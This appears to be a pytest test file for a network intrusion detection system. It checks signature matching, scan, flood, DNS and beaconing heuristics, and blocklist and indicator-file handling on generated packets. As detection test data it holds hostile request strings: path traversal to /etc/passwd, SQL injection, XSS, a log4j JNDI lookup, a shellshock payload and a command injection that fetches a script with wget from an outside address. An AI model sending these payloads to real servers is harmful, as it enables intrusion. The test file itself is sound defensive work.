"""NIDS signature and heuristic layer: patterns, heuristics and the evidence they produce (generated packets only)."""
import numpy as np
import pytest

from layered_nids.packets.pcap import Packet
from layered_nids.signatures import HeuristicConfig, calibrate, match_request, scan
from layered_nids.rules.blocklist import Blocklists

SYN, ACK, PSH = 0x02, 0x10, 0x08
H = "192.168.2.50"


def pkt(ts, dst="93.184.216.5", proto="tcp", sport=40000, dport=80, flags=0, qname="", req="", src=H, size=100):
    return Packet(float(ts), size, "aa:aa:aa:aa:aa:01", "bb:bb:bb:bb:bb:02", src, dst, proto, sport, dport, qname, flags, req)


@pytest.mark.parametrize("req,name", [
    ("GET trav.example /download?file=../../../../etc/passwd", "directory traversal"),
    ("GET x /a?f=%2e%2e%2f%2e%2e%2fsecret", "directory traversal"),
    ("GET x /a?f=%252e%252e%252fsecret", "directory traversal"),                       # double-encoded
    ("GET x /item.php?id=1' OR 1=1--", "sql injection"),
    ("GET x /item?id=1 UNION SELECT user,pass FROM t", "sql injection"),
    ("GET x /?q=<script>alert(1)</script>", "cross-site scripting"),
    ("GET x /a/${jndi:ldap://203.0.113.9/x}", "log4j lookup"),
    ("GET x /cgi-bin/x?a=() { :;}; /bin/id", "shellshock"),
    ("GET x /.env", "web shell or admin probe"),
    ("POST x /cgi-bin/run.cgi;wget http://203.0.113.9/a.sh", "command injection"),
])
def test_signatures_match_known_attack_shapes(req, name):
    assert name in {n for n, _ in match_request(req)}


@pytest.mark.parametrize("req", ["", "GET example.org /", "GET example.org /index.html", "GET example.org /images/logo.png?size=2",
                                 "GET example.org /search?q=how+to+bake+bread", "GET example.org /docs/readme.md"])
def test_ordinary_requests_do_not_match(req):
    assert match_request(req) == []


def test_traversal_request_gives_a_signature_evidence_with_trail():
    ev = scan([pkt(10.0, req="GET trav.example /download?file=../../../../etc/passwd")])
    assert ev and ev[0].layer == "rules" and ev[0].host == H
    assert ev[0].detail["signature"] is True and "traversal" in ev[0].detail["trail"] and "traversal" in ev[0].reason
    assert 0.0 < ev[0].score <= 1.0


def test_inbound_attack_is_attributed_to_the_internal_victim():
    p = pkt(5.0, src="45.33.32.156", dst=H, req="GET x /a?f=../../etc/passwd")
    assert scan([p])[0].host == H


def test_horizontal_scan_and_quiet_host():
    scanner = [pkt(i * 0.05, dst=f"10.0.{i // 250}.{i % 250 + 1}", dport=23, flags=SYN) for i in range(120)]
    quiet = [pkt(i * 3.0, dst="93.184.216.5", src="192.168.2.77", dport=443, flags=ACK) for i in range(20)]
    ev = scan(sorted(scanner + quiet, key=lambda p: p.ts))
    assert {e.host for e in ev if e.detail["trail"] == "scan"} == {H}
    assert not [e for e in ev if e.host == "192.168.2.77"]


def test_syn_flood_to_one_target_is_not_a_scan():
    ev = scan([pkt(i / 100.0, dst="93.184.216.5", dport=80, flags=SYN, sport=1025 + i) for i in range(900)])
    trails = {e.detail["trail"] for e in ev}
    assert "syn_flood" in trails and "scan" not in trails       # one target, one port: a flood, not a scan
    assert all(e.detail["signature"] is False for e in ev)


def test_random_dns_names_are_flagged_but_normal_names_are_not():
    rng = np.random.default_rng(0)
    rnd = ["".join(rng.choice(list("abcdefghijklmnopqrstuvwxyz0123456789"), 14)) + ".example.net" for _ in range(60)]
    ev = scan([pkt(i * 0.5, dst="8.8.8.8", proto="udp", dport=53, qname=q) for i, q in enumerate(rnd)])
    assert "dns_random" in {e.detail["trail"] for e in ev}
    normal = ["www.google.com", "mail.example.org", "api.github.com", "cdn.jsdelivr.net", "time.windows.com"] * 20
    assert not [e for e in scan([pkt(i * 0.5, dst="8.8.8.8", proto="udp", dport=53, qname=q) for i, q in enumerate(normal)]) if e.detail["trail"] == "dns_random"]


def test_beaconing_needs_regular_contacts_and_ignores_time_and_dns_ports():
    reg = [pkt(100 + i * 30.0 + (0.1 if i % 2 else 0), dst="93.184.216.9", dport=443, flags=SYN) for i in range(12)]
    assert "beaconing" in {e.detail["trail"] for e in scan(reg)}
    rng = np.random.default_rng(1)
    irregular = [pkt(float(t), dst="93.184.216.9", dport=443, flags=SYN) for t in np.cumsum(rng.exponential(30, 12))]
    assert "beaconing" not in {e.detail["trail"] for e in scan(irregular)}
    ntp = [pkt(100 + i * 64.0, dst="93.184.216.123", proto="udp", dport=123) for i in range(12)]
    assert "beaconing" not in {e.detail["trail"] for e in scan(ntp)}


def test_calibration_only_raises_thresholds_and_uses_clean_traffic():
    clean = [pkt(i * 0.2, dst=f"93.184.216.{i % 200 + 1}", dport=443 + i % 3) for i in range(1200)]
    cfg = calibrate(clean, fpr=0.01)
    base = HeuristicConfig()
    assert cfg.scan_min_targets >= base.scan_min_targets and cfg.dns_min >= base.dns_min and cfg.arp_min >= base.arp_min


def test_blocklist_hit_is_a_signature(tmp_path):
    f = tmp_path / "feed1.txt"
    f.write_text("93.184.216.66\nevil.example\n")
    bl = Blocklists.from_files([f])
    ev = scan([pkt(1.0, dst="93.184.216.66"), pkt(2.0, dst="8.8.8.8", proto="udp", dport=53, qname="a.evil.example")], blocklists=bl)
    assert len(ev) == 2 and all(e.detail["signature"] for e in ev)


def test_indicator_file_kinds_matching_and_suspicious_policy(tmp_path):
    from layered_nids.signatures.trails import Trails
    f = tmp_path / "t.csv"
    f.write_text("# comment line\n"
                 "198.18.5.5/,evilbot (malware),(static)\n"
                 "198.18.6.6:8443,c2 panel (malicious),(static)\n"
                 "bad.example,dropper (malware),(static)\n"
                 "/payload/mirai.arm7,elf mirai (malware),(static)\n"
                 "cdn.bad2.example/x/y.exe,dropper (malware),(static)\n"
                 r"gen[0-9]{3}\.tk,generic (malware),(static)" "\n"
                 "9.9.9.10,public resolver (suspicious),(static)\n")
    tr = Trails.load(f)
    assert len(tr) == 7 and "198.18.5.5" in tr.ips and "198.18.6.6:8443" in tr.ip_ports and "bad.example" in tr.domains and len(tr.regexes) == 1
    ev = scan([pkt(1.0, dst="198.18.5.5"), pkt(2.0, dst="198.18.6.6", dport=8443),
               pkt(3.0, dst="8.8.8.8", proto="udp", dport=53, qname="a.b.bad.example"),
               pkt(4.0, dst="8.8.8.8", proto="udp", dport=53, qname="gen123.tk"),
               pkt(5.0, req="GET x.example /payload/mirai.arm7?a=1"),
               pkt(6.0, req="GET cdn.bad2.example /x/y.exe"),
               pkt(7.0, dst="9.9.9.10")], trails=tr)
    sig = {e.detail["trail"] for e in ev if e.detail["signature"]}
    assert sig == {"198.18.5.5", "198.18.6.6:8443", "bad.example", "/payload/mirai.arm7", "cdn.bad2.example/x/y.exe", r"gen[0-9]{3}\.tk"}
    weak = [e for e in ev if e.detail["trail"] == "9.9.9.10"]
    assert len(weak) == 1 and weak[0].detail["signature"] is False and weak[0].score < 0.5
    assert "evilbot" in [e for e in ev if e.detail["trail"] == "198.18.5.5"][0].reason          # description looked up from the file
    assert not scan([pkt(1.0, dst="93.184.216.34", proto="udp", dport=53, qname="www.example.org")], trails=tr)     # ordinary traffic: nothing
    assert not tr.match(pkt(1.0, dst="8.8.8.8", proto="udp", dport=53, qname="notbad.example"))                     # not a sub-domain
